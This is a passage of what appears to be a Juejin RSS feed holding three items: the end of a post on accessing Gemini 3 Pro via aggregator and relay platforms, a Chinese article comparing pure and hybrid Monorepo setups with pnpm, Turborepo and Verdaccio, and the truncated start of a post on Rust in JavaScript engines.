<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/81825fc04e9b4a218f3ff38680fddccf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=nrlSeKWDmbOMxzjLiehcp%2BIDJOk%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-26">优势</h3>
<ul>
<li>国内可用</li>
<li>提供所有主流模型</li>
</ul>
<h3 data-id="heading-27">限制</h3>
<ul>
<li>Gemini 3 Pro需要付费使用</li>
</ul>
<h3 data-id="heading-28">使用</h3>
<p>在模型对话页面选择【Gemini 3 Pro Preview】模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9d92aa6e2654b84b59628198ce25dbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=bmb%2BqabhFojVHES54IVUqFp9jJA%3D" alt="图片" loading="lazy"/></p>
<p>本人OpenRouter欠费了，这里就不做demo了</p>
<h2 data-id="heading-29">ZenMux</h2>
<p>ZenMux是一个类似OpenRouter的模型聚合平台</p>
<p>官网地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzenmux.ai" target="_blank" title="https://zenmux.ai" ref="nofollow noopener noreferrer">zenmux.ai</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a635a4cdc7b1497684b018e93f75e32f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=4T6RleFCx5gUi%2Ft7wW8HcOvxyxk%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-30">优势</h3>
<ul>
<li>国内可用</li>
<li>提供Gemini 3 Pro付费和免费模型</li>
<li>提供所有主流模型</li>
</ul>
<h3 data-id="heading-31">限制</h3>
<ul>
<li>需要科学上网环境</li>
</ul>
<h3 data-id="heading-32">使用</h3>
<p>在ZenMux首页选择【Gemini 3 Pro Preview Free】模型</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb70f2dd7f7e41bd8848cf156fabc185~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=voNPPAe22UFaPM0AMqSJQD8WFJ4%3D" alt="图片" loading="lazy"/></p>
<p>输入提示词，复刻的bilibili官网首页效果如下:</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4f043d908b494c9fa5d80e0a3ee24c15~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=%2FeBzY2eYlABMKDAa5enEYBWl1%2FQ%3D" alt="图片" loading="lazy"/></p>
<p>复刻的MiniMax官网首页效果如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e52a62e2449b4c08b4ffc5d97afaa4a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=5ktiwE7iDcUKeG%2BNMyZqY2Gc%2FEk%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-33">中转站</h2>
<p>以上平台对国内使用都不是很友好，解决不了网络问题的小伙伴可以考虑使用国内中转站，很多中转站已经接入Gemini 3 Pro模型了。对中转站感兴趣的小伙伴也可以看往期内容：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzU5Njg3ODUzOA%3D%3D%26mid%3D2247493035%26idx%3D1%26sn%3D9ccc174a34a0ee59e6a609e409b09908%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzU5Njg3ODUzOA==&amp;mid=2247493035&amp;idx=1&amp;sn=9ccc174a34a0ee59e6a609e409b09908&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">Claude Code CLI平台与中转站接入汇总及避坑</a></p>
<p>这里友情提供两个比较稳定的（非广告，我只想要个邀请奖励😁）</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8998bdffa12498d9e7a7b6141fd9281~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=YmZ%2FI5ZuQ4rp%2F5kagMnjWv1uLDM%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-34">优势</h3>
<ul>
<li>国内可用</li>
<li>可联系站主获取体验额度</li>
</ul>
<h3 data-id="heading-35">限制</h3>
<ul>
<li>付费使用</li>
</ul>
<h3 data-id="heading-36">PackyCode</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e72f1b699b942afbcff367ab3cdda51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=8NXFRxm7jwwX9fUXn%2FgiZDJTpHw%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20aa22c35fea4bb8bfba9154de91d593~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=NY9pvjLi0IZHOaNkaDWWoLjY7ZQ%3D" alt="图片" loading="lazy"/></p>
<p>邀请链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.packyapi.com%2Fregister%3Faff%3DzLOw" target="_blank" title="https://www.packyapi.com/register?aff=zLOw" ref="nofollow noopener noreferrer">www.packyapi.com/register?af…</a></p>
<h3 data-id="heading-37">IKunCode</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7ddd27b7ec06485c91443bf067ced516~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=y%2BFBPrcQadARlfYFJod96Q7QIy4%3D" alt="图片" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c78e709e5a34528855ac427254057be~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5rqq5b285bK4:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764481394&amp;x-signature=FxiM6XSh8T9QYQFIjtSlsSTN%2B0s%3D" alt="图片" loading="lazy"/></p>
<p>邀请链接：<a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.ikuncode.cc%2Fregister%3Faff%3DkD2Q" target="_blank" title="https://api.ikuncode.cc/register?aff=kD2Q" ref="nofollow noopener noreferrer">api.ikuncode.cc/register?af…</a></p>
<h2 data-id="heading-38">友情提示</h2>
<p>见原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhiV51BPYiS5YQZS02esPoA" target="_blank" title="https://mp.weixin.qq.com/s/hiV51BPYiS5YQZS02esPoA" ref="nofollow noopener noreferrer">体验Gemini 3 Pro的N多种方式</a></p>
<blockquote>
<p>本文同步自微信公众号 "<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhiV51BPYiS5YQZS02esPoA" target="_blank" title="https://mp.weixin.qq.com/s/hiV51BPYiS5YQZS02esPoA" ref="nofollow noopener noreferrer">程序员小溪</a>" ，这里只是同步，想看及时消息请移步我的公众号，不定时更新我的学习经验。友情提示友情提示</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[纯Monorepo vs 混合式Monorepo]]></title>    <link>https://juejin.cn/post/7575655132747907108</link>    <guid>https://juejin.cn/post/7575655132747907108</guid>    <pubDate>2025-11-23T03:00:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132747907108" data-draft-id="7575159361904279593" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="纯Monorepo vs 混合式Monorepo"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2025-11-23T03:00:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="欧阳的棉花糖"/> <meta itemprop="url" content="https://juejin.cn/user/958429872784541"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            纯Monorepo vs 混合式Monorepo
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/958429872784541/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    欧阳的棉花糖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:00:43.000Z" title="Sun Nov 23 2025 03:00:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、开篇：用生活场景理解两种模式</h3>
<p>如果要同时管理 “个人博客”“通用工具库”“公司业务系统” 三个项目，两种模式给出了不同的 “管理方案”——</p>
<h4 data-id="heading-1">纯 Monorepo：“一家人住同一套大公寓”</h4>
<p>所有项目都放进<strong>一个 Git 仓库</strong>（相当于一套大公寓），共用 “水电燃气”（工程化配置，如 ESLint、构建工具）和 “家具家电”（依赖包，如 React、Vue）。改工具库的代码，博客项目立刻能用上，不用 “搬东西”（发版、升级）。</p>
<h4 data-id="heading-2">混合式 Monorepo：“邻居住同一小区，共用健身房 + 偶尔串门借东西”</h4>
<p>每个项目还是<strong>独立的 Git 仓库</strong>（相当于小区里的不同住户），但都放进同一个文件夹（如 <code>apps/</code>，相当于小区），共用 “公共设施”（pnpm 依赖缓存、turbo 构建加速）；遇到需要改工具库的情况，能临时 “串门借东西”（本地关联公共库代码），改完后再 “归位”（公共库发版、业务项目升级）。</p>
<h3 data-id="heading-3">二、核心对比：8 个维度讲透差异</h3>


















































<table><thead><tr><th>对比维度</th><th>纯 Monorepo</th><th>混合式 Monorepo</th></tr></thead><tbody><tr><td><strong>1. 仓库结构</strong></td><td>1 个 Git 仓库，所有项目是仓库内的子目录（如 <code>packages/工具库</code>、<code>apps/博客</code>）</td><td>N 个独立 Git 仓库，放在同一目录下（如 <code>apps/博客</code> 内有自己的 <code>.git</code> 文件夹）</td></tr><tr><td><strong>2. 项目联动</strong></td><td>改公共库后，业务项目实时生效，1 次提交同步所有变更</td><td>日常：公共库发版 + 业务项目升级；特殊场景：本地关联公共库，改完后分别提交</td></tr><tr><td><strong>3. 依赖管理</strong></td><td>全仓库依赖统一在根目录 <code>package.json</code> 管理，子项目直接引用本地目录</td><td>日常：各项目独立 <code>package.json</code>，共用 pnpm 缓存；特殊场景：<code>pnpm link</code> 本地关联公共库</td></tr><tr><td><strong>4. 准备工作</strong></td><td>需配置 “工作区”（如 pnpm workspaces），指定子项目目录</td><td>零配置门槛：克隆独立仓库到同一文件夹，特殊场景加 <code>pnpm link</code> 即可</td></tr><tr><td><strong>5. 典型工具</strong></td><td>工作区工具：pnpm workspaces、Lerna、Turborepo（全仓库构建）</td><td>缓存工具 + 关联工具：pnpm（缓存 + link）、turbo（单项目加速）、Verdaccio（私有包仓库）</td></tr><tr><td><strong>6. 版本控制</strong></td><td>所有项目共用一套版本记录，工具库升级 = 仓库整体提交</td><td>每个项目独立版本，公共库版本和业务项目版本分开管理</td></tr><tr><td><strong>7. 团队协作</strong></td><td>适合 “全栈式协作”：同一批人既改业务又维护工具库</td><td>适合 “分工 + 灵活协作”：基建组管公共库，业务组管项目，特殊场景临时联动</td></tr><tr><td><strong>8. 迁移成本</strong></td><td>需合并多个独立仓库代码，整理历史提交</td><td>直接把现有仓库放进同一目录，特殊场景加本地关联配置</td></tr></tbody></table>
<h3 data-id="heading-4">三、关键场景：什么时候需要高频联动？</h3>
<p>虽然大部分时候公共库很稳定，但以下 4 种情况，纯 Monorepo 的 “一键联动” 会更高效：</p>
<ol>
<li>
<p><strong>小团队 / 初创团队</strong>：没人专职维护公共库，开发博客时发现工具库缺功能，得自己改工具库再同步业务；</p>
</li>
<li>
<p><strong>公共库重大更新</strong>：比如组件库从 Vue2 升到 Vue3，业务项目要跟着改引用方式，天天需要联调；</p>
</li>
<li>
<p><strong>业务专属公共库</strong>：比如电商团队的 “订单工具库”，只服务订单业务，业务改需求就得同步改工具库；</p>
</li>
<li>
<p><strong>ToB 定制需求</strong>：客户要在报表页加特殊筛选，得改公共表格组件，再同步到业务项目，周期短要求快。</p>
</li>
</ol>
<p>而混合式 Monorepo 能兼顾：日常用 “独立仓库 + 发版” 保证稳定，遇到以上场景用 “本地关联” 临时联动，不用强行合并仓库。</p>
<h3 data-id="heading-5">四、实际操作：两种模式怎么用？</h3>
<h4 data-id="heading-6">案例 1：新增 “日历组件库”</h4>
<ul>
<li><strong>纯 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>根仓库新建 <code>packages/日历组件</code>；</p>
</li>
<li>
<p>博客项目直接引用 <code>import 日历 from '@我的仓库/日历组件'</code>；</p>
</li>
<li>
<p>一次提交：<code>git commit -m "新增日历组件+博客接入"</code>。</p>
</li>
</ol>
<ul>
<li><strong>混合式 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>单独建 “日历组件” 仓库，开发完发私有 npm 包（用 Verdaccio）；</p>
</li>
<li>
<p>博客项目执行 <code>pnpm install @我的账号/日历组件</code>；</p>
</li>
<li>
<p>两次提交：先提交组件库，再提交博客项目。</p>
</li>
</ol>
<h4 data-id="heading-7">案例 2：修复工具库 bug（高频联动场景）</h4>
<ul>
<li><strong>纯 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>改 <code>packages/工具库</code> 的 bug；</p>
</li>
<li>
<p>切换到博客项目验证；</p>
</li>
<li>
<p>一次提交搞定。</p>
</li>
</ol>
<ul>
<li><strong>混合式 Monorepo</strong>：</li>
</ul>
<ol>
<li>
<p>日常：改工具库→发版 v1.0.1→博客项目 <code>pnpm update</code>→提交；</p>
</li>
<li>
<p>紧急联动：用 <code>pnpm link ../工具库</code> 本地关联→改完工具库直接验证→工具库发版 + 博客项目升级→分别提交。</p>
</li>
</ol>
<h3 data-id="heading-8">四、工具选型：两种模式的 “好搭档”</h3>
<h4 data-id="heading-9">纯 Monorepo 必备工具</h4>

























<table><thead><tr><th>工具名称</th><th>作用</th><th>简单用法</th></tr></thead><tbody><tr><td>pnpm workspaces</td><td>管理全仓库依赖和子项目目录</td><td>根目录写 <code>packages: ['packages/*', 'apps/*']</code></td></tr><tr><td>Turborepo</td><td>全仓库增量构建，一次启动所有项目</td><td><code>turbo run dev</code> 根目录执行</td></tr><tr><td>Lerna</td><td>批量给子项目发版</td><td><code>lerna publish</code> 一键升版本</td></tr></tbody></table>
<h4 data-id="heading-10">混合式 Monorepo 常用工具</h4>

























<table><thead><tr><th>工具名称</th><th>作用</th><th>简单用法</th></tr></thead><tbody><tr><td>pnpm</td><td>依赖缓存 + 本地关联公共库</td><td><code>pnpm link ../工具库</code> 关联；<code>pnpm install</code> 用缓存</td></tr><tr><td>Verdaccio</td><td>搭私有 npm 仓库，存公共库包</td><td>启动后 <code>npm publish --registry 本地地址</code></td></tr><tr><td>turbo</td><td>加速单个项目构建启动</td><td>进入博客目录 <code>turbo dev</code></td></tr></tbody></table>
<h3 data-id="heading-11">五、常见问题解答</h3>
<h4 data-id="heading-12">Q1：纯 Monorepo 仓库会越来越大吗？</h4>
<p>不会！根目录 <code>.gitignore</code> 排除 <code>node_modules/</code>（依赖不进仓库）、<code>dist/</code>（构建产物不进仓库），大文件用 Git LFS 存，体积可控。</p>
<h4 data-id="heading-13">Q2：混合式 Monorepo 能复用工具库代码吗？</h4>
<p>当然！日常用私有 npm 包（Verdaccio）安装引用，紧急情况用 <code>pnpm link</code> 本地关联，两种方式都能复用。</p>
<h4 data-id="heading-14">Q3：团队变大后能切换模式吗？</h4>
<ul>
<li>
<p>混合式→纯 Monorepo：把所有仓库代码合并到一个新仓库，配好工作区即可；</p>
</li>
<li>
<p>纯 Monorepo→混合式：拆分需要独立的项目，初始化新仓库发私有包，其他项目安装引用。</p>
</li>
</ul>
<h3 data-id="heading-15">六、选型指南：3 步选对模式</h3>
<h4 data-id="heading-16">第一步：看 “联动频率”</h4>
<ul>
<li>
<p>每周都要改公共库 + 业务代码→纯 Monorepo；</p>
</li>
<li>
<p>半年改一次公共库，日常只开发业务→混合式 Monorepo。</p>
</li>
</ul>
<h4 data-id="heading-17">第二步：看 “团队分工”</h4>
<ul>
<li>
<p>3-5 人小团队，一人多岗→纯 Monorepo；</p>
</li>
<li>
<p>10 人以上，基建组和业务组分工明确→混合式 Monorepo。</p>
</li>
</ul>
<h4 data-id="heading-18">第三步：看 “灵活度需求”</h4>
<ul>
<li>
<p>想少配置，快速启动→混合式 Monorepo（克隆仓库就能用）；</p>
</li>
<li>
<p>愿意花 10 分钟配工作区，换长期高效→纯 Monorepo。</p>
</li>
</ul>
<h3 data-id="heading-19">七、总结：没有 “最优”，只有 “适配”</h3>
<ul>
<li>
<p>纯 Monorepo 是 “高效联动派”：适合高频改公共库、小团队协作，用 “一次提交” 省时间；</p>
</li>
<li>
<p>混合式 Monorepo 是 “稳定灵活派”：适合分工明确、公共库稳定的场景，日常稳定 + 紧急联动两不误。</p>
</li>
</ul>
<p>不用纠结 “必须选哪种”，小团队可以先从纯 Monorepo 起步，团队变大分工明确后，过渡到混合式；也可以直接用混合式，兼顾稳定和灵活 —— 核心是让模式适配你的开发节奏～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JS 引擎赛道中的 Rust 角色]]></title>    <link>https://juejin.cn/post/7575102474639736883</link>    <guid>https://juejin.cn/post/7575102474639736883</guid>    <pubDate>2025-11-23T03:10:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575102474639736883" data-draft-id="7575133880435654707" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JS 引擎赛道中的 Rust 角色"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-23T03:10:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Yanni4Night"/> <meta itemprop="url" content="https://juejin.cn/user/4089838983724520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JS 引擎赛道中的 Rust 角色
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4089838983724520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Yanni4Night
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T03:10:51.000Z" title="Sun Nov 23 2025 03:10:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读16分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body 